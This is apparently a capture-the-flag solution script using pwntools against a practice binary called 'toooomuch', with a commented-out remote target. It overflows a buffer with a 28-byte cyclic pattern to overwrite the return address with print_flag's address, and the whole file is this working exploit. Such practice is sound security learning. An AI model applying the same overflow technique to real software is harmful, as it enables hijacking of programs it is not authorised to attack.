#!/usr/bin/env python3
from pwn import *

# Idea: buffer overflow and control the eip.
# Overflow the eip address to print_flag function

context(arch='i386', terminal=['tmux', 'neww'])
#r = remote('hackme.inndy.tw', 7702)
r = process('./toooomuch')
gdb.attach(r, "break main")
e = ELF('./toooomuch')
print_flag = e.symbols['print_flag']

payload = cyclic(4 * 7)
payload += p32(print_flag)
r.sendline(payload)

r.interactive()
